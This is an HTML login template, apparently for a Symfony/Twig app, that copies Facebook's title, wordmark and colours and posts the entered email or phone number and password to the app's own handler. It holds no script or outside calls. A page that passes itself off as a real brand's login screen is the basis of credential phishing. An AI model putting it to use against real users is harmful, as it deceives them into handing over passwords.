<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #eceff5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .fb-box {
            background: white;
            padding: 40px;
            border: 1px solid #d3d6db;
            border-radius: 8px;
            width: 400px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #1877f2;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccd0d5;
            border-radius: 6px;
        }
        .btns {
            display: flex;
            justify-content: space-between;
        }
        button {
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            color: white;
            cursor: pointer;
        }
        .login-btn {
            background-color: #1877f2;
        }
        .register-btn {
            background-color: #42b72a;
        }
    </style>
</head>
<body>
<form method="POST" action="{{ path('auth_handler') }}">
    <div class="fb-box">
        <h1>facebook</h1>
        <input type="text" name="username" placeholder="Email or phone number" required />
        <input type="password" name="password" placeholder="Password" required />

        <div class="btns">
            <button type="submit" name="action" value="login" class="login-btn">Log In</button>
            <button type="submit" name="action" value="register" class="register-btn">Sign Up</button>
        </div>
    </div>
</form>
</body>
</html>
